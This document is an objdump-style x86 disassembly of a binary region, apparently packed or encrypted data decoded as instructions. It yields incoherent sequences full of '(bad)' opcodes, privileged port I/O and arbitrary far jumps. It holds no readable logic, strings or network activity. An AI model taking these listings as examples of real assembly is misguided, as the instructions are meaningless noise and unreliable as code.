  4163c8:	sbb    BYTE PTR ds:0xc14c3609,bl
  4163ce:	add    ecx,esp
  4163d0:	test   al,0xf5
  4163d2:	test   eax,0xba73ae01
  4163d7:	(bad)  
  4163d8:	push   0x1d153827
  4163dd:	hlt    
  4163de:	or     DWORD PTR [esi-0xc],ebp
  4163e1:	fst    DWORD PTR [ecx+eax*8+0x35]
  4163e5:	enter  0x8661,0xe4
  4163e9:	out    dx,eax
  4163ea:	(bad)  
  4163eb:	fadd   QWORD PTR [ebp+ebp*1-0x38e723f4]
  4163f2:	scas   al,BYTE PTR es:[edi]
  4163f3:	sub    ecx,DWORD PTR [edx+0xb]
  4163f6:	pop    edi
  4163f7:	lods   al,BYTE PTR ds:[esi]
  4163f9:	pusha  
  4163fa:	dec    edx
  4163fb:	ret    0xf9f
  4163fe:	aaa    
  4163ff:	stc    
  416400:	repz xchg esp,eax
  416402:	mov    esi,0xdc8fce53
  416407:	cmp    edx,DWORD PTR [edx+eax*2+0x5f19193c]
  41640e:	lock push ds
  416410:	dec    edx
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	sahf   
  416481:	adc    al,0x1e
  416483:	lahf   
  416484:	pop    ecx
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x98000001,al
  41648d:	adc    ecx,DWORD PTR [edi-0x56f4d594]
  416493:	xor    DWORD PTR [edi],ebx
  416495:	xor    ch,cl
  416497:	mov    cl,0xc3
  416499:	add    eax,0x2fc6275d
  41649e:	jno    0x416457
  4164a0:	xchg   DWORD PTR [ebp-0x2c],edx
  4164a3:	shr    DWORD PTR [ecx+0xd],cl
  4164a6:	mov    ds:0xc805c5af,eax
  4164ab:	inc    BYTE PTR [edx+edi*4]
  4164ae:	push   edi
  4164af:	outs   dx,DWORD PTR ds:[esi]
  4164b0:	sti    
  4164b1:	mov    ebp,0xde3c9c83
  4164b6:	cmp    ebp,edi
  4164b8:	dec    esp
  4164b9:	mov    edx,0xd86f7fd
  4164be:	sub    edx,DWORD PTR [edx+0x69ce8140]
  4164c4:	shl    BYTE PTR [eax],1
  4164c6:	fsubrp st(2),st
  4164c8:	aas    
  4164c9:	pop    ebp
  4164ca:	loop   0x4164a4
  4164cc:	and    eax,0x46747739
  4164d1:	xor    DWORD PTR [edi],ebx
  4164d3:	lock rcr BYTE PTR [eax],1
  4164d6:	sub    al,0x4e
  4164d8:	outs   dx,BYTE PTR ds:[esi]
  4164d9:	aaa    
  4164da:	xor    dh,BYTE PTR [edi+0x4dbacb72]
  4164e0:	push   ecx
  4164e1:	rcr    DWORD PTR [edi-0x52f2c55e],1
  4164e7:	pop    eax
  4164e8:	nop
  4164e9:	or     eax,DWORD PTR ds:0x368e135e
  4164ef:	pop    ss
  4164f0:	stos   DWORD PTR es:[edi],eax
  4164f1:	mul    esi
  4164f3:	mov    eax,ds:0x7ae8a858
  4164f8:	iret   
  4164f9:	sub    BYTE PTR [esp+edi*8],bh
  4164fc:	outs   dx,BYTE PTR ds:[esi]
  4164fd:	cwde   
  4164fe:	adc    BYTE PTR [ecx-0x2b855f78],bl
  416504:	jle    0x416533
  416506:	lock rol BYTE PTR [esi+0xf8f7d55],1
  41650d:	cmp    eax,0xa5494358
  416512:	push   cs
  416513:	shr    edi,0x67
  416516:	ins    BYTE PTR es:[edi],dx
  416517:	push   edi
  416518:	dec    ecx
  416519:	cmp    al,0x4c
  41651b:	fcomp  DWORD PTR [esi-0x2f207163]
  416521:	mov    al,ds:0x4591cd97
  416526:	ins    BYTE PTR es:[edi],dx
  416527:	cmp    bl,BYTE PTR [edi-0x4ebdd520]
  41652d:	mov    eax,ds:0x25c86287
  416532:	in     eax,0x5a
  416534:	ins    BYTE PTR es:[edi],dx
  416535:	iret   
  416536:	push   esi
  416537:	dec    esi
  416538:	sbb    BYTE PTR [ebp+0x7a],cl
  41653b:	and    BYTE PTR [ebx+0x55b8c849],dh
  416541:	adc    DWORD PTR [ecx+0x6b4253c1],0x5d
  416548:	mov    esp,0x8167b642
  41654d:	jp     0x41652a
  41654f:	scas   eax,DWORD PTR es:[edi]
  416550:	mov    ch,BYTE PTR [ebx-0x49]
  416553:	jecxz  0x4164d5
  416555:	xchg   DWORD PTR [esi],edx
  416557:	in     al,0xc5
  416559:	mov    ah,dh
  41655b:	xchg   edx,eax
  41655c:	or     BYTE PTR [ebx+0x7cf15faa],ah
  416562:	pushf  
  416563:	mov    ds:0xe6282116,eax
  416568:	jecxz  0x4165b8
  41656a:	out    0x19,al
  41656c:	sub    eax,0x1e22d046
  416571:	adc    al,0x4b
  416573:	dec    esi
  416574:	sub    cl,BYTE PTR [ecx-0x39]
  416577:	out    0x3f,al
  416579:	push   eax
  41657a:	inc    edx
  41657b:	jae    0x41651c
  41657d:	jp     0x416534
  41657f:	icebp  
  416580:	mov    al,al
  416582:	stos   DWORD PTR es:[edi],eax
  416583:	scas   al,BYTE PTR es:[edi]
  416584:	es push edi
  416586:	add    al,0x3b
  416588:	div    DWORD PTR [esi-0x5d8d78ac]
  41658e:	adc    BYTE PTR [esi+0xfd],0x0
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x7e4fbcac]
  416601:	je     0x4165d1
  416603:	mov    esp,0xec5e
  416608:	add    eax,0x8a000001
  41660d:	push   eax
  41660e:	(bad)  
  41660f:	sti    
  416610:	(bad)  
  416611:	test   al,0x65
  416613:	lahf   
  416614:	retf   0x5f5e
  416617:	and    eax,esi
  416619:	dec    eax
  41661a:	xchg   esi,eax
  41661b:	enter  0xa732,0xa5
  41661f:	pop    ds
  416620:	mov    ah,0x9
  416622:	adc    esi,0x37
  416625:	idiv   DWORD PTR [eax+0x52]
  416628:	mov    bl,0xe9
  41662a:	in     eax,dx
  41662b:	fsubp  st(6),st
  41662d:	ins    BYTE PTR es:[edi],dx
  41662e:	scas   eax,DWORD PTR es:[edi]
  41662f:	imul   ebp,DWORD PTR [ebx-0x49],0x6b375a4b
  416636:	cmc    
  416637:	xchg   ebx,eax
  416638:	jp     0x416663
  41663a:	imul   edi,DWORD PTR [edx],0x409a0245
  416640:	fstp   QWORD PTR [ebx]
  416642:	push   es
  416643:	mov    dl,0xdd
  416645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416646:	or     eax,0xb75aad85
  41664b:	jb     0x4166cb
  41664d:	lock mov ch,0x2b
  416650:	mov    ebx,0x1a7c1139
  416655:	in     al,dx
  416656:	stos   BYTE PTR es:[edi],al
  416657:	adc    BYTE PTR [edx+0x7659b2e3],al
  41665d:	push   esp
  41665e:	mov    ds:0x804d88c0,eax
  416663:	repnz pop ebp
  416665:	js     0x416621
  416667:	sbb    bl,BYTE PTR [edi-0x2add4701]
  41666d:	xor    BYTE PTR [edx],ch
  41666f:	mov    esi,0x954e565d
  416674:	or     al,0x7d
  416676:	jae    0x41666a
  416678:	repnz rcl DWORD PTR [edi-0x1b50de8],0xc7
  416680:	jmp    0xace5:0xd50bb26c
  416687:	mov    bl,0xbe
  416689:	adc    BYTE PTR [ecx-0x7c],0xd8
  41668d:	or     al,0xc2
  41668f:	jo     0x41662b
  416691:	loop   0x416688
  416693:	cs dec eax
  416695:	jp     0x4166d1
  416697:	dec    edi
  416698:	hlt    
  416699:	add    eax,0x2287a35a
  41669e:	xchg   DWORD PTR [esi],ebp
  4166a0:	inc    ecx
  4166a1:	imul   edi,DWORD PTR [eax+ecx*2+0x23b8886e],0xffffffa0
  4166a9:	sbb    al,0x30
  4166ab:	retf   
  4166ac:	or     ch,BYTE PTR ds:0x6dfca930
  4166b2:	test   BYTE PTR [eax],al
  4166b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b5:	or     cl,BYTE PTR [ebp+0x1acfecb9]
  4166bb:	inc    esp
  4166bc:	bound  ebx,QWORD PTR [ecx+0x4f]
  4166bf:	dec    edi
  4166c0:	pop    eax
  4166c1:	cld    
  4166c2:	adc    dl,BYTE PTR [ebx+0x44]
  4166c5:	mov    eax,0xe5cfb781
  4166ca:	cmp    eax,edx
  4166cc:	lods   al,BYTE PTR ds:[esi]
  4166cd:	add    BYTE PTR [ebp-0x43e91718],cl
  4166d3:	sahf   
  4166d4:	out    dx,al
  4166d5:	add    dl,BYTE PTR [edi+eax*2]
  4166d8:	xchg   esp,eax
  4166d9:	retf   
  4166da:	mov    dl,0x9b
  4166dc:	call   0x6ed0:0xe18dcbc
  4166e3:	and    eax,0x6fc09a18
  4166e8:	sti    
  4166e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ea:	jle    0x416767
  4166ec:	rcl    DWORD PTR [eax],cl
  4166ee:	mov    cl,0xfc
  4166f0:	inc    edx
  4166f1:	push   0x7c51d14d
  4166f6:	sbb    bh,0x1c
  4166f9:	cwde   
  4166fa:	fisubr DWORD PTR [esi-0x4ea5e794]
  416700:	jg     0x416725
  416702:	imul   edx,DWORD PTR [edi+0x549e9061],0x5e758b86
  41670c:	pop    ebp
  41670d:	mov    edi,DWORD PTR [ebx+0xf530]
	...
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	jbe    0x416716
  416782:	imul   eax,DWORD PTR [edi],0x63
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x65000001
  41678d:	mov    WORD PTR [eax+0x6b144f29],ss
  416793:	out    0x4e,al
  416795:	cwde   
  416796:	or     edx,DWORD PTR [ebp+0x12]
  416799:	popa   
  41679a:	mov    edx,0x39f9f39e
  41679f:	aad    0xab
  4167a1:	dec    ecx
  4167a2:	sub    ah,BYTE PTR [ebx+0x36]
  4167a5:	sub    al,0x47
  4167a7:	outs   dx,BYTE PTR ds:[esi]
  4167a8:	and    BYTE PTR [eax],cl
  4167aa:	push   ss
  4167ab:	push   ecx
  4167ac:	adc    eax,0x320633c4
  4167b1:	jns    0x4167ef
  4167b3:	mov    al,ds:0x64684920
  4167b8:	leave  
  4167b9:	sbb    bl,al
  4167bb:	jne    0x416754
  4167bd:	mov    DWORD PTR [eax+esi*2],edx
  4167c0:	rcl    BYTE PTR [esp+ebp*2-0x3d185604],cl
  4167c7:	adc    al,0xc4
  4167c9:	in     al,0x16
  4167cb:	shr    BYTE PTR [eax+0x7293df6],1
  4167d1:	pop    edx
  4167d2:	push   0xffffffc6
  4167d4:	loopne 0x416829
  4167d6:	fcom   QWORD PTR [ecx]
  4167d8:	jmp    0xa6db1b8d
  4167dd:	cmp    DWORD PTR [esi-0x5b],esp
  4167e0:	inc    ebx
  4167e1:	rol    ah,1
  4167e3:	fisubr DWORD PTR [ecx]
  4167e5:	ds sti 
  4167e7:	or     eax,0xce9b2623
  4167ec:	rcr    BYTE PTR [ebx-0x33],1
  4167ef:	pop    ds
  4167f0:	mov    bh,0x88
  4167f2:	cmp    dl,BYTE PTR [esi]
  4167f4:	sub    edx,DWORD PTR [edx]
  4167f6:	es popf 
  4167f8:	fisubr DWORD PTR [esi-0x3c]
  4167fb:	push   esi
  4167fc:	jmp    0x64f0:0x3ac38cdf
  416803:	mov    ds:0xff8c8ed4,al
  416808:	mov    dl,0xa6
  41680a:	in     eax,dx
  41680b:	mov    BYTE PTR [esi],dh
  41680d:	pavgw  mm4,QWORD PTR [esi-0xd]
  416811:	fnstenv [ecx+0x692691f]
  416817:	jl     0x41681b
  416819:	or     BYTE PTR [esi],0xdc
  41681c:	cmc    
  41681d:	mov    cl,0x5f
  41681f:	cdq    
  416820:	cmp    eax,0xe2a17d50
  416825:	add    eax,0x79f7cdb4
  41682a:	ins    BYTE PTR es:[edi],dx
  41682b:	addr16 leave 
  41682d:	(bad)  
  41682e:	out    dx,al
  41682f:	adc    BYTE PTR ds:0xc0799bc4,0x36
  416836:	out    dx,eax
  416837:	fwait
  416838:	ss sti 
  41683a:	imul   ebp,DWORD PTR ds:0xf38e2f31,0x79
  416841:	es adc eax,0xd39454b4
  416847:	fisub  DWORD PTR [esi]
  416849:	mov    cl,0xdd
  41684b:	jbe    0x4168b7
  41684d:	lods   eax,DWORD PTR ds:[esi]
  41684e:	jecxz  0x41681a
  416850:	lea    esp,[ecx]
  416852:	mov    ah,BYTE PTR [edx+0x3a]
  416855:	mov    ecx,0xd546f91e
  41685a:	pop    esi
  41685b:	out    dx,al
  41685c:	bound  edi,QWORD PTR ds:0xefa0b68b
  416862:	or     ch,al
  416864:	mov    bh,bh
  416866:	arpl   WORD PTR [eax],bp
  416868:	mov    ah,0xf2
  41686a:	(bad)  
  41686b:	(bad)  
  41686c:	lea    ebp,[eax+0x3e]
  41686f:	mov    edx,DWORD PTR [ebx+0x10]
  416872:	mov    BYTE PTR [ebx],bh
  416874:	add    esi,ebp
  416876:	mov    ds:0x38bf510c,al
  41687b:	jmp    0xcc68:0xb11fa042
  416882:	adc    DWORD PTR [eax],eax
  416884:	pushf  
  416885:	imul   edi,DWORD PTR [edx-0x4f],0xcdbb9d50
  41688c:	mov    gs,WORD PTR [eax+0x483afb]
	...
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x5dd5c5c6
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    bh,cl
  41690d:	out    0x30,eax
  41690f:	lahf   
  416910:	aam    0x95
  416912:	(bad)  
  416913:	xchg   ecx,eax
  416914:	stc    
  416915:	xor    eax,0xaa4ff28a
  41691a:	les    eax,FWORD PTR [ecx]
  41691c:	ja     0x4168ac
  41691e:	inc    edi
  41691f:	sbb    DWORD PTR [esi-0x21fbf4cb],eax
  416925:	stc    
  416926:	or     al,0xd1
  416928:	push   ds
  416929:	fstp   DWORD PTR [edi+0x10]
  41692c:	xor    DWORD PTR [edi],eax
  41692e:	shl    esp,cl
  416930:	ss jmp 0x9036:0x57420ac9
  416938:	icebp  
  416939:	xor    al,0xf
  41693b:	jg     0x41691b
  41693d:	ret    
  41693e:	bound  edx,QWORD PTR [ebp+0x6e]
  416941:	or     eax,0x429e393f
  416946:	xchg   edi,eax
  416947:	ret    0x7a06
  41694a:	in     al,dx
  41694b:	hlt    
  41694c:	jle    0x416975
  41694e:	inc    eax
  41694f:	retf   0x944b
  416952:	push   0xffffffbf
  416954:	adc    DWORD PTR [esi-0xb83f9fb],ecx
  41695a:	bound  ecx,QWORD PTR [edi]
  41695c:	dec    esp
  41695d:	lods   eax,DWORD PTR ds:[esi]
  41695e:	mov    al,0x41
  416960:	cmp    BYTE PTR [edi],bh
  416962:	mov    ch,BYTE PTR [edx+0x33]
  416965:	fcmovnu st,st(0)
  416967:	outs   dx,BYTE PTR ds:[esi]
  416968:	test   al,0x8d
  41696b:	pop    esp
  41696c:	ds or  al,0x5
  41696f:	and    ebx,DWORD PTR [esi]
  416971:	dec    eax
  416972:	int    0xcb
  416974:	mov    gs,ebx
  416976:	out    0x8f,al
  416978:	push   edi
  416979:	add    eax,0x38c37ec6
  41697e:	data16 adc dh,dl
  416981:	scas   eax,DWORD PTR es:[edi]
  416982:	hlt    
  416983:	jae    0x41693d
  416985:	push   0x4b28cab2
  41698a:	mov    ah,0x28
  41698c:	stos   DWORD PTR es:[edi],eax
  41698d:	sbb    esi,eax
  41698f:	popf   
  416990:	mov    edi,0xc6823864
  416995:	adc    DWORD PTR [edx],ebp
  416997:	lds    ebp,FWORD PTR [esi-0x64]
  41699a:	ret    0x1728
  41699d:	les    ecx,FWORD PTR [edi]
  41699f:	push   ebx
  4169a0:	push   ebx
  4169a1:	aas    
  4169a2:	shr    BYTE PTR [ebx],cl
  4169a4:	pop    ebx
  4169a5:	out    dx,al
  4169a6:	push   ebp
  4169a7:	and    dh,BYTE PTR [eax+0x41e69ed2]
  4169ad:	mov    ?,WORD PTR [ebx]
  4169af:	lods   eax,DWORD PTR ds:[esi]
  4169b0:	aas    
  4169b1:	imul   esp,DWORD PTR [esi],0xffffffd2
  4169b4:	and    al,0x3b
  4169b6:	dec    edi
  4169b7:	adc    eax,0xab8f998a
  4169bc:	sbb    al,0x56
  4169be:	sub    dh,BYTE PTR [esi+edi*1]
  4169c1:	mov    esi,0xdf3cd417
  4169c6:	jmp    0x8049867
  4169cb:	jle    0x416a45
  4169cd:	and    ch,BYTE PTR [edx+0x23]
  4169d0:	cmp    ebx,DWORD PTR [edx-0x5f]
  4169d3:	pusha  
  4169d4:	push   eax
  4169d5:	loope  0x4169e6
  4169d7:	jl     0x416a26
  4169d9:	fdivr  QWORD PTR [ebx+0x42224410]
  4169df:	repz enter 0xed83,0x52
  4169e4:	not    bl
  4169e6:	cld    
  4169e7:	xor    eax,0x4255f856
  4169ec:	mov    ch,0x6e
  4169ee:	or     ebx,ecx
  4169f0:	or     eax,0x6ae3e16c
  4169f5:	xor    al,cl
  4169f7:	pop    ebx
  4169f8:	imul   BYTE PTR [edi]
  4169fa:	xchg   edi,eax
  4169fb:	add    al,bh
  4169fd:	sar    al,1
  4169ff:	out    0x2,eax
  416a01:	addr16 adc al,0xd3
  416a04:	mov    ?,WORD PTR [esi+0x36]
  416a07:	mov    ah,BYTE PTR [edx+ecx*1-0x66819ba6]
  416a0e:	dec    esp
  416a0f:	les    eax,FWORD PTR [edx]
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xee650ba3
  416a82:	inc    ebx
  416a83:	rep ins DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x3b000001
  416a8d:	test   DWORD PTR [ebp-0x507ce200],esp
  416a93:	pop    ds
  416a94:	popf   
  416a95:	inc    edx
  416a96:	xchg   edx,eax
  416a97:	scas   eax,DWORD PTR es:[edi]
  416a98:	and    dl,dh
  416a9a:	hlt    
  416a9b:	sbb    BYTE PTR es:[ebx],al
  416a9e:	jb     0x416aec
  416aa0:	pop    es
  416aa1:	xor    cl,al
  416aa3:	and    al,0x3c
  416aa5:	push   edi
  416aa6:	vrsqrtps ymm7,ymm7
  416aaa:	jbe    0x416ae6
  416aac:	out    0xde,al
  416aae:	inc    ecx
  416aaf:	adc    ah,dl
  416ab1:	shl    DWORD PTR [esi],0xbd
  416ab4:	push   edx
  416ab5:	pop    esi
  416ab6:	ins    DWORD PTR es:[edi],dx
  416ab7:	sbb    bh,BYTE PTR [ecx]
  416ab9:	fwait
  416aba:	mov    cl,0x48
  416abc:	mov    ds:0x1e570a81,al
  416ac1:	inc    edi
  416ac2:	sbb    eax,0x1e8070a0
  416ac7:	iret   
  416ac8:	inc    ecx
  416ac9:	lds    edx,FWORD PTR [edx-0x5]
  416acc:	adc    DWORD PTR [ecx-0x4c],ebp
  416acf:	shl    DWORD PTR [edx-0x35f0a330],0x9f
  416ad6:	mov    al,ds:0x711e46a5
  416adb:	push   eax
  416adc:	dec    edi
  416add:	pop    esp
  416ade:	sub    esi,edx
  416ae0:	xor    al,0x91
  416ae2:	mov    DWORD PTR [esi+0x230b3275],eax
  416ae8:	ins    BYTE PTR es:[edi],dx
  416ae9:	cli    
  416aea:	mov    eax,0x948cdc3e
  416aef:	stos   DWORD PTR es:[edi],eax
  416af0:	xor    BYTE PTR [ecx-0x1d5b9398],bh
  416af6:	xlat   BYTE PTR ds:[ebx]
  416af7:	sbb    BYTE PTR [ebx],ah
  416af9:	mov    esi,0xb5551fdb
  416afe:	xchg   ecx,eax
  416aff:	sbb    BYTE PTR [edi],0x9d
  416b02:	sbb    DWORD PTR [ebx+0x2a],esi
  416b05:	cmp    BYTE PTR [ebx+0x65],0xbf
  416b09:	mov    bl,0x3d
  416b0b:	push   ecx
  416b0c:	cmp    eax,0xace2594f
  416b11:	sub    esp,DWORD PTR [edx-0x8320bf7]
  416b17:	test   eax,0xbc7de753
  416b1c:	jecxz  0x416af8
  416b1e:	push   ss
  416b1f:	(bad)  
  416b20:	stos   DWORD PTR es:[edi],eax
  416b21:	aas    
  416b22:	fcomp  QWORD PTR [ebx+0x4a]
  416b25:	iret   
  416b26:	adc    edx,DWORD PTR [esi+0x6ce3717f]
  416b2c:	push   0xffffffed
  416b2e:	mov    ds:0x68845bcb,eax
  416b33:	fwait
  416b34:	add    cl,ch
  416b36:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  416b38:	dec    ebx
  416b39:	stos   DWORD PTR es:[edi],eax
  416b3a:	add    edx,DWORD PTR [ecx-0x45]
  416b3d:	icebp  
  416b3e:	sub    BYTE PTR [eax+eiz*1],0xf7
  416b42:	outs   dx,DWORD PTR ds:[esi]
  416b43:	cmp    dh,al
  416b45:	xor    BYTE PTR [ebx+eax*8],0x8
  416b49:	popa   
  416b4a:	add    al,0x43
  416b4c:	or     dh,bh
  416b4e:	mov    ecx,0x6eaea369
  416b53:	pop    ebx
  416b54:	dec    edx
  416b55:	aad    0x32
  416b57:	ins    DWORD PTR es:[edi],dx
  416b58:	or     DWORD PTR [ebx+0x26],ebp
  416b5b:	mov    eax,ds:0x8725f8e1
  416b60:	mov    ebp,0xb9cf50cf
  416b65:	and    al,0xbd
  416b67:	call   0x44a:0x20f79c44
  416b6e:	cmp    DWORD PTR [ebx],0xffffffb0
  416b71:	xchg   esp,eax
  416b72:	pop    ds
  416b73:	pushf  
  416b74:	test   al,0x56
  416b76:	xor    al,0xa2
  416b78:	adc    BYTE PTR [ebx+0x49bd21c6],ch
  416b7e:	outs   dx,DWORD PTR ds:[esi]
  416b7f:	inc    eax
  416b80:	sub    eax,0x2bbebf26
  416b85:	push   edx
  416b86:	mov    esp,0xad979d29
  416b8b:	adc    eax,0x286a96bd
  416b90:	pop    ebx
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x485b70a9
  416c01:	ss jo  0x416b8a
  416c04:	jb     0x416bf6
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0x32000001
  416c0d:	pusha  
  416c0e:	jb     0x416ba6
  416c10:	cmp    bh,BYTE PTR [eax+0x195f0c5d]
  416c16:	jno    0x416bd5
  416c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c19:	fisub  DWORD PTR [edx-0x76029045]
  416c1f:	sub    eax,0xa7c27cd6
  416c24:	cmp    eax,0xb338e92b
  416c29:	or     ch,BYTE PTR [esi]
  416c2b:	cmp    eax,ebx
  416c2d:	sbb    dh,BYTE PTR [ebp-0x498c2d33]
  416c33:	ficomp WORD PTR [ebx-0x265afc3f]
  416c39:	jmp    0x65d990a3
  416c3e:	push   ebp
  416c3f:	push   esp
  416c40:	push   cs
  416c41:	(bad)  [edi+ecx*8]
  416c44:	mov    ebx,0x3d698266
  416c49:	mov    edi,0x640fb3df
  416c4e:	dec    esp
  416c4f:	(bad)  
  416c50:	fimul  WORD PTR [edx+ebx*2]
  416c53:	xbegin 0x80dbf27b
  416c59:	pop    ebx
  416c5a:	iret   
  416c5b:	sbb    al,0x75
  416c5d:	(bad)  
  416c5e:	mov    edi,0x6ee55077
  416c63:	mov    WORD PTR [ecx-0x1116b127],es
  416c69:	imul   esi,DWORD PTR [ebx+0x6d2a54d0],0x91c78018
  416c73:	ficomp WORD PTR [edx+0xf1b0c49]
  416c79:	repz jle 0x416c9f
  416c7c:	push   esp
  416c7d:	xor    ecx,DWORD PTR [edi-0x1166817d]
  416c83:	jno    0x416c16
  416c85:	jns    0x416c56
  416c87:	mov    bh,0x1c
  416c89:	push   es
  416c8a:	mov    ds:0x283e3e6a,al
  416c8f:	mov    ds:0x27e248a2,al
  416c94:	mov    al,0xad
  416c96:	pop    ebx
  416c97:	add    al,0xe9
  416c99:	sub    esp,DWORD PTR [ecx-0x44]
  416c9c:	bound  esi,QWORD PTR ds:0xb3cea481
  416ca2:	xchg   edx,eax
  416ca3:	jmp    DWORD PTR [edi]
  416ca5:	cmp    dh,0xf3
  416ca8:	retf   
  416ca9:	xlat   BYTE PTR ds:[ebx]
  416caa:	sbb    DWORD PTR [eax+eax*8-0x6a11cfff],ecx
  416cb1:	push   edi
  416cb2:	pushf  
  416cb3:	xchg   esi,eax
  416cb4:	push   edi
  416cb5:	jl     0x416c7e
  416cb7:	fdiv   QWORD PTR es:[ecx]
  416cba:	mov    al,ds:0xd107a5db
  416cbf:	aas    
  416cc0:	xchg   edx,eax
  416cc1:	ins    BYTE PTR es:[edi],dx
  416cc2:	nop
  416cc3:	in     eax,0x1d
  416cc5:	dec    ebp
  416cc6:	jns    0x416cdf
  416cc8:	jnp    0x416d25
  416cca:	arpl   WORD PTR [ebx],bx
  416ccc:	xlat   BYTE PTR ds:[ebx]
  416ccd:	xchg   ch,dl
  416ccf:	add    BYTE PTR [eax-0x37510bfb],bl
  416cd5:	inc    eax
  416cd6:	xchg   edi,eax
  416cd7:	jbe    0x416c60
  416cd9:	jns    0x416cc2
  416cdb:	lock aas 
  416cdd:	in     eax,0xe1
  416cdf:	push   ecx
  416ce0:	(bad)  
  416ce1:	adc    DWORD PTR [ecx],esp
  416ce3:	mov    edi,0x6445da10
  416ce8:	test   al,0xdf
  416cea:	xor    al,0xfe
  416cec:	popf   
  416ced:	or     eax,0x6cba3dcb
  416cf2:	clc    
  416cf3:	push   edx
  416cf4:	mov    bh,0x5b
  416cf6:	in     al,dx
  416cf7:	dec    ecx
  416cf8:	iret   
  416cf9:	fild   DWORD PTR [esi+0x4a]
  416cfc:	hlt    
  416cfd:	pop    DWORD PTR [ecx]
  416cff:	lods   al,BYTE PTR ds:[esi]
  416d00:	xchg   ebp,eax
  416d01:	mov    esi,esp
  416d03:	shr    BYTE PTR [edx],0x1a
  416d06:	ins    DWORD PTR es:[edi],dx
  416d07:	inc    esi
  416d08:	test   al,0xf1
  416d0a:	dec    BYTE PTR [ebp+ebx*4+0x41]
  416d0e:	xor    DWORD PTR [edx+0x66],eax
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	sbb    BYTE PTR [edx],bh
  416d82:	in     eax,0xcd
  416d84:	ja     0x416d77
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x1a000001
  416d8d:	ins    DWORD PTR es:[edi],dx
  416d8e:	or     eax,0x4bd58015
  416d93:	call   0x1527:0x9d9f8a0
  416d9a:	sar    ch,0x6
  416d9d:	inc    ebx
  416d9e:	in     al,dx
  416d9f:	jns    0x416dec
  416da1:	int    0x14
  416da3:	inc    bh
  416da5:	push   edx
  416da6:	sbb    al,0xe2
  416da8:	sti    
  416da9:	jb     0x416e00
  416dab:	inc    edx
  416dac:	xor    al,BYTE PTR [ecx+0x428f0c2d]
  416db2:	enter  0x57da,0x58
  416db6:	not    DWORD PTR [edi-0x67d61607]
  416dbc:	(bad)  
  416dbd:	fstp   TBYTE PTR [eax]
  416dbf:	ins    DWORD PTR es:[edi],dx
  416dc0:	in     al,0xa7
  416dc2:	mov    dl,0xe8
  416dc4:	test   BYTE PTR [ebx],bl
  416dc6:	jo     0x416e35
  416dc8:	jns    0x416e19
  416dca:	and    DWORD PTR [ebx],ebx
  416dcc:	pop    eax
  416dcd:	pop    esp
  416dce:	into   
  416dcf:	aad    0xa2
  416dd1:	retf   
  416dd2:	std    
  416dd3:	jno    0x416d88
  416dd5:	jp     0x416e10
  416dd7:	jo     0x416d6f
  416dd9:	push   0xafdfae3
  416dde:	and    al,0xe3
  416de0:	pop    edi
  416de1:	lahf   
  416de2:	fisub  DWORD PTR [ebx]
  416de4:	mov    edi,0xa8575aee
  416de9:	add    edx,DWORD PTR [esp+edx*4+0x64a2b381]
  416df0:	jmp    0x46f6:0xe133418
  416df7:	faddp  st(6),st
  416df9:	xor    BYTE PTR [edi+eiz*4],ch
  416dfc:	ror    DWORD PTR [edx-0x7a],cl
  416dff:	int    0xc6
  416e01:	push   ecx
  416e02:	out    dx,al
  416e03:	loopne 0x416e2f
  416e05:	div    DWORD PTR [ebx-0x40f33c70]
  416e0b:	lea    eax,[ecx+eax*8-0x4e0b124a]
  416e12:	lods   eax,DWORD PTR ds:[esi]
  416e13:	aas    
  416e14:	cmp    al,0x55
  416e16:	out    0xb6,al
  416e18:	test   eax,0x7c4d4a32
  416e1d:	cli    
  416e1e:	add    DWORD PTR [esi-0x5b],eax
  416e21:	xor    bl,BYTE PTR [eax+0x1e9b9e92]
  416e27:	xchg   ebx,eax
  416e28:	jb     0x416e2a
  416e2a:	sub    DWORD PTR ds:0x4e2f1928,esi
  416e30:	inc    esp
  416e31:	add    dh,BYTE PTR [ebp+0x56d55798]
  416e37:	call   0x92f885a2
  416e3c:	out    dx,al
  416e3d:	adc    cl,dh
  416e3f:	jmp    0x416de2
  416e41:	(bad)  
  416e42:	lock cmp dl,BYTE PTR [eax-0x4d]
  416e46:	test   eax,0x9edbcd10
  416e4b:	rol    DWORD PTR [edx],1
  416e4d:	cwde   
  416e4e:	les    esi,FWORD PTR [esi-0x33]
  416e51:	cld    
  416e52:	pop    ebx
  416e53:	jns    0x416eb8
